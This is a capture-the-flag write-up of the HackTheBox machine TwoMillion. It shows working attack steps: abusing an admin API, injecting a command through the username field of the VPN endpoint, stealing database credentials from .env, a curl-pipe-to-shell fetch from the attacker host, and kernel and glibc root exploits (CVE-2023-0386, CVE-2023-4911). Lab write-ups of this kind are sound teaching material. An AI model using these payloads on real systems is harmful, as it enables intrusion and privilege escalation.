
---
title: HackTheBox - TwoMillion
date: Thu Aug 15 06:03:11 PM EDT 2024
categories: [PentestNotes]
tags: [linux,rce,reversing,cve-2023-4911,cve-2023-0386,htb]
---

## Recon

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.221:22
Open 10.10.11.221:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.10.11.221
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-28 09:26 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:27
Completed Parallel DNS resolution of 1 host. at 09:27, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:27
Scanning 10.10.11.221 [2 ports]
Discovered open port 80/tcp on 10.10.11.221
Discovered open port 22/tcp on 10.10.11.221
Completed Connect Scan at 09:27, 0.08s elapsed (2 total ports)
Initiating Service scan at 09:27
Scanning 2 services on 10.10.11.221
Completed Service scan at 09:27, 6.16s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 2.56s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.33s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
Nmap scan report for 10.10.11.221
Host is up, received user-set (0.078s latency).
Scanned at 2024-07-28 09:27:00 UTC for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:27
Completed NSE at 09:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```
</details>

{::options parse_block_html="false" /}

```bash
└─$ grep 2mil /etc/hosts
10.10.11.221    2million.htb
```

## HTTP (80)

### `/invite`

Application is Single Page Application. The only url on current domain seems to be `/invite` 

![Writeup.png](/assets/images/Machines/TwoMillion/Writeup.png)

![Writeup-1.png](/assets/images/Machines/TwoMillion/Writeup-1.png)

Enumerate for directories:

```bash
└─$ feroxbuster -u http://2million.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://2million.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       96l      285w     3859c http://2million.htb/invite 
200      GET       80l      232w     3704c http://2million.htb/login 
200      GET       27l      201w    15384c http://2million.htb/images/favicon.png
200      GET      260l      328w    29158c http://2million.htb/images/logo-transparent.png
200      GET      245l      317w    28522c http://2million.htb/images/logofull-tr-web.png 
403      GET        7l        9w      146c http://2million.htb/css/
403      GET        7l        9w      146c http://2million.htb/images/ 
403      GET        7l        9w      146c http://2million.htb/js/ 
200      GET        5l     1881w   145660c http://2million.htb/js/htb-frontend.min.js     
200      GET        8l     3162w   254388c http://2million.htb/js/htb-frontpage.min.js    
401      GET        0l        0w        0c http://2million.htb/api
200      GET       13l     2209w   199494c http://2million.htb/css/htb-frontpage.css 
200      GET     1242l     3326w    64952c http://2million.htb/ 
200      GET       13l     2458w   224695c http://2million.htb/css/htb-frontend.css 
200      GET       46l      152w     1674c http://2million.htb/404
302      GET        0l        0w        0c http://2million.htb/home => http://2million.htb/
200      GET        1l        8w      637c http://2million.htb/js/inviteapi.min.js 
405      GET        0l        0w        0c http://2million.htb/api/v1/invite/verify 
200      GET       94l      293w     4527c http://2million.htb/register
302      GET        0l        0w        0c http://2million.htb/logout => http://2million.htb/x
405      GET        0l        0w        0c http://2million.htb/api/v1/user/login 
405      GET        0l        0w        0c http://2million.htb/api/v1/user/register
[####################] - 2m     37548/37548   0s      found:23      errors:4
[####################] - 89s     4728/4728    53/s    http://2million.htb/
[####################] - 87s     4728/4728    54/s    http://2million.htb/assets/
[####################] - 86s     4728/4728    55/s    http://2million.htb/controllers/
[####################] - 34s     4728/4728    137/s   http://2million.htb/views/ 
```

### JS Shinanigans

Looks like API is in place and we can't just access stuff. On `/invite` we can notice [/js/inviteapi.min.js](http://2million.htb/js/inviteapi.min.js) which is obfuscated code.. I really didn't want to deobfuscate Javascript code, so why not let browser do it?!

Get all the functions in current window (`inviteapi`  is loaded)
```js
> Object.keys(window).forEach((key, index)=>{if(typeof window[key]==='function'){console.log(`${index}: ${key}`);}});
...
VM149:1 223: verifyInviteCode
VM149:1 224: makeInviteCode 
```

Convert interesting functions to strings and get actual functions!

```js
> verifyInviteCode.toString()
`function verifyInviteCode(code){var formData={"code":code};$.ajax({type:"POST",dataType:"json",data:formData,url:'/api/v1/invite/verify',success:function(response){console.log(response)},error:function(response){console.log(response)}})}`
> makeInviteCode.toString()
`function makeInviteCode(){$.ajax({type:"POST",dataType:"json",url:'/api/v1/invite/how/to/generate',success:function(response){console.log(response)},error:function(response){console.log(response)}})}`
```

Nice, `makeInviteCode` looks interesting.
```js
function makeInviteCode() {
  $.ajax({
    type: 'POST',
    dataType: 'json',
    url: '/api/v1/invite/how/to/generate',
    success: function (response) {
      console.log(response)
    },
    error: function (response) {
      console.log(response)
    },
  })
}
```

### Get invite code and Register

```bash
└─$ curl 2million.htb/api/v1/invite/how/to/generate -sd '{}' | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Decode [ROT13](https://rot13.com): 
```bash
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Make same request to API:
```bash
└─$ curl 2million.htb/api/v1/invite/generate -sd '{}' | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "SDlYSFctMkxHMTctVDE5NjItOEVRTDk=",
    "format": "encoded"
  }
}
└─$ echo 'SDlYSFctMkxHMTctVDE5NjItOEVRTDk=' | base64 -d
H9XHW-2LG17-T1962-8EQL9
```

Good, using this code we are able to get invited from `/invite`:

![Writeup-2.png](/assets/images/Machines/TwoMillion/Writeup-2.png)

## Platform

> Creds: `test02@2million.htb:test02:test02`
{: .prompt-tip }

![Writeup-3.png](/assets/images/Machines/TwoMillion/Writeup-3.png)

### VPN

In `Access` page we can download OpenVPN config to connect to network.

![Writeup-4.png](/assets/images/Machines/TwoMillion/Writeup-4.png)

### API

The request to `/api/v1/user` indicates that there are different APIs, probably **admin** and **user**.

If we make request to `/api/v1` we get documentation of methods available:
```bash
└─$ curl 'http://2million.htb/api/v1' -H 'Cookie: PHPSESSID=3a5bvlopp1219mr73s91em243i' -s | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

#### Become admin

Using API methods become admin
```bash
└─$ curl 'http://2million.htb/api/v1/admin/auth' -H 'Cookie: PHPSESSID=3a5bvlopp1219mr73s91em243i'
{"message":false}

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT
{"status":"danger","message":"Invalid content type."}                                                                                                                                                             
└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -d ''
{"status":"danger","message":"Invalid content type."} 

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -H 'Cookie: PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -d '{}'
{"status":"danger","message":"Invalid content type."}

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -H 'Content-Type: application/json' -d '{}'
{"status":"danger","message":"Missing parameter: email"}

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -H 'Content-Type: application/json' -d '{"email": "test02@2million.htb"}'
{"status":"danger","message":"Missing parameter: is_admin"}

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -H 'Content-Type: application/json' -d '{"email": "test02@2million.htb", "is_admin": true}'
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}

└─$ curl 'http://2million.htb/api/v1/admin/settings/update' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -X PUT -H 'Content-Type: application/json' -d '{"email": "test02@2million.htb", "is_admin": 1}'
{"id":15,"username":"test02","is_admin":1}

└─$ curl 'http://2million.htb/api/v1/admin/auth' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i'
{"message":true} 
```

#### Admin VPN

```bash
└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i'

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -d ''
{"status":"danger","message":"Invalid content type."} 

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{}'
{"status":"danger","message":"Missing parameter: username"}             

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02"}' -so test02_admin.ovpn
```

#### RCE

I don't think we are able to connect to VPN so let's try something else. The generated certificates look awfully similar to what linux tool generate, most probably the username is passed to the command line.

```bash
└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02; ls -alh"}'

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02;id"}'

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02;id#"}'

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02;id #"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`/api/v1/admin/vpn/generate` is vulnerable to RCE

#### Applications env variables

```bash
└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02;ls -alh #"}'
total 56K
drwxr-xr-x 10 root root 4.0K Jul 28 10:50 .
drwxr-xr-x  3 root root 4.0K Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1.3K Jun  2  2023 Database.php
-rw-r--r--  1 root root 2.8K Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4.0K Jul 28 10:50 VPN
drwxr-xr-x  2 root root 4.0K Jun  6  2023 assets
drwxr-xr-x  2 root root 4.0K Jun  6  2023 controllers
drwxr-xr-x  5 root root 4.0K Jun  6  2023 css
drwxr-xr-x  2 root root 4.0K Jun  6  2023 fonts
drwxr-xr-x  2 root root 4.0K Jun  6  2023 images
-rw-r--r--  1 root root 2.7K Jun  2  2023 index.php
drwxr-xr-x  3 root root 4.0K Jun  6  2023 js
drwxr-xr-x  2 root root 4.0K Jun  6  2023 views

└─$ curl 'http://2million.htb/api/v1/admin/vpn/generate' -b 'PHPSESSID=3a5bvlopp1219mr73s91em243i' -H 'Content-Type: application/json' -d '{"username": "test02;cat .env #"}'
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## Reverse Shell

![Writeup-5.png](/assets/images/Machines/TwoMillion/Writeup-5.png)

```bash
www-data@2million: mysql --version
mysql  Ver 15.1 Distrib 10.6.12-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper

www-data@2million: mysql -u 'admin' -p'SuperDuperPass123' -e 'SHOW DATABASES;'
Database
htb_prod
information_schema

www-data@2million: mysql -u 'admin' -p'SuperDuperPass123' htb_prod -e 'SHOW TABLES;'
Tables_in_htb_prod
invite_codes
users

www-data@2million: mysql -u 'admin' -p'SuperDuperPass123' htb_prod -e 'SELECT * FROM users;'
id      username        email   password        is_admin
11      TRX     trx@hackthebox.eu       $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq    1
12      TheCyberGeek    thecybergeek@hackthebox.eu      $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK    1
13      test    test@test.pp    $2y$10$VNDqbO7tk3C2/69glMv29uzxOjSAYsQ56m.xM0JVYNeHIBgFH5HIe    1
14      test123 test@test.com   $2y$10$lYMn7MtiuzYmAKvw7kzK.uUsSXrT4yCZ5TGxqaGYuf7t7IQ/hjS/G    1
15      test02  test02@2million.htb     $2y$10$ajYFfmqGn4LGJAfKsF7F2.effuEK6NyFQKgx/LSxXIziwXCOIe9Ii    1
```

Nothing interesting in the database.

## SSH (22)

```bash
www-data@2million: cat /etc/passwd | grep -vE 'false|nologin'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
```

`admin` is a user on machine so we can try to SSH as him.

> Creds: `admin:SuperDuperPass123`
{: .prompt-tip }

### User.txt

```bash
admin@2million:~$ cat user.txt
0dbd2f0701c4acc555f748953c803f6e
```

## Privilege Escalation (root)

```bash
admin@2million:~$ find / -perm -4000 2>/dev/null
/snap/snapd/19122/usr/lib/snapd/snap-confine
/snap/core20/1891/usr/bin/chfn
/snap/core20/1891/usr/bin/chsh
/snap/core20/1891/usr/bin/gpasswd
/snap/core20/1891/usr/bin/mount
/snap/core20/1891/usr/bin/newgrp
/snap/core20/1891/usr/bin/passwd
/snap/core20/1891/usr/bin/su
/snap/core20/1891/usr/bin/sudo
/snap/core20/1891/usr/bin/umount
/snap/core20/1891/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1891/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

There's odd port open 11211, connection doesn't give anything and commands return ERROR...
```bash
admin@2million:~$ ss -tunlp4
Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port                Process
udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                         0.0.0.0:*
udp                  UNCONN                0                     0                                          0.0.0.0:68                                         0.0.0.0:*
tcp                  LISTEN                0                     80                                       127.0.0.1:3306                                       0.0.0.0:*
tcp                  LISTEN                0                     1024                                     127.0.0.1:11211                                      0.0.0.0:*
tcp                  LISTEN                0                     511                                        0.0.0.0:80                                         0.0.0.0:*
tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                         0.0.0.0:*
tcp                  LISTEN                0                     128                                        0.0.0.0:22                                         0.0.0.0:*
admin@2million:~$ nc 0 11211
Hallo
ERROR
uwu
ERROR
help
ERROR
?
ERROR
!
ERROR
^C
admin@2million:~$ curl 0:11211
curl: (52) Empty reply from server
admin@2million:~$ ps aux | grep 11211
memcache    1187  0.0  0.2 483068 10688 ?        Ssl  Jul26   1:05 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
admin      13859  0.0  0.0   6608  2228 pts/0    S+   12:58   0:00 grep --color=auto 11211
```

Maybe it's not interesting..

```bash
admin@2million:/dev/shm$ curl 10.10.14.37/lp.sh|sh|tee lp.log
...
╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/mail/admin
      271      4 -rw-r--r--   1 admin    admin         540 Jun  2  2023 /var/spool/mail/admin
...
admin@2million:/dev/shm$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
admin@2million:/dev/shm$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

Google -> `linux 5.15.70-051570-generic exploit` ->
- [The OverlayFS vulnerability CVE-2023-0386: Overview, detection, and remediation](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/)
- [Linux Kernel 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)](https://www.exploit-db.com/exploits/50808)

_A system is likely to be vulnerable if it has a kernel version lower than 6.2._

The `exploitdb` didn't work, so I moved to 2023 exploit.

```bash
└─$ curl -LO https://github.com/sxlmnwb/CVE-2023-0386/archive/refs/heads/master.zip
---
└─$ cd `mktemp -d`
└─$ curl 10.10.14.37/master.zip -sO
└─$ unzip master.zip
└─$ cd CVE-2023-0386-master
└─$ make all
└─$ tmux
└─$ ./fuse ./ovlcap/lower ./gc # Pane 1
└─$ ./exp                      # Pane 2
```

> **Note**: To use tmux inside a tmux session use handle twice. e.g.: `Ctrl+B+B + "` to split vertically.
{: .prompt-tip }

![Writeup-6.png](/assets/images/Machines/TwoMillion/Writeup-6.png)

### Root.txt

```bash
root@2million:/root# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)

root@2million:/root# cat root.txt
df2dda740438d294e32ded660b6cdc59
```

## Privilege Escalation (root) \[v2\]

\[Following guided mode of HTB!\]

```bash
admin@2million:/tmp/tmp.Eqx6aFcEpS/CVE-2023-0386-master$ ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

The glibc version is vulnerable to **[CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)**

- Qualsys Blog Post: [https://blog.qualys.com/vulnerabiliti...](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbVRhaFNTckRZbGR2T2h4QmgwcWswLS02ZVpHd3xBQ3Jtc0trUHNzTEN4SW5NOVNEOVljdjZCV3JDZlpDcW1BVWRtY0dYcVJSMHlHUHdWUmUtUVI3MEVuRE1rbWRGSGxoQ0F4eFNreW1Ld3U0cldHcnF0ZHRCQzI1dTJralJPam1vcVA0TmpWc2dOc1ZXelBjbUR4WQ&q=https%3A%2F%2Fblog.qualys.com%2Fvulnerabilities-threat-research%2F2023%2F10%2F03%2Fcve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so&v=1iV-CD9Apn8) - 
- Qualsys Tech Details: [https://www.qualys.com/2023/10/03/cve...](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbEJXVEdncEhGZkxwYWFwMVVTZjJuUWZDR05Md3xBQ3Jtc0tuWF8yaFNsZEhyUlBJcVBHYnpULUhIWW41d0lkdGdLLVpFOHNrelJoYWZieGVlUUxscVl6eTVFZmx5OVZyWHBOVVpiRGNWVEFURUZXNy1WanhNWW56eXpfaTZKY2JOaXVTb1lnR1Jib0NVRHRRdjNyRQ&q=https%3A%2F%2Fwww.qualys.com%2F2023%2F10%2F03%2Fcve-2023-4911%2Flooney-tunables-local-privilege-escalation-glibc-ld-so.txt&v=1iV-CD9Apn8)

```bash
admin@2million:/tmp/tmp.Eqx6aFcEpS/CVE-2023-0386-master$ env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
Segmentation fault (core dumped) # <-- Exploit will work
```

The given PoC is kind of complicated to make work, 

```bash
admin@2million:/tmp/tmp.Eqx6aFcEpS/CVE-2023-4911$ gcc exp.c
admin@2million:/tmp/tmp.Eqx6aFcEpS/CVE-2023-4911$ ./a.out
try 100
try 200
try 300
try 400
try 500
try 600
try 700
try 800
try 900
try 1000
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```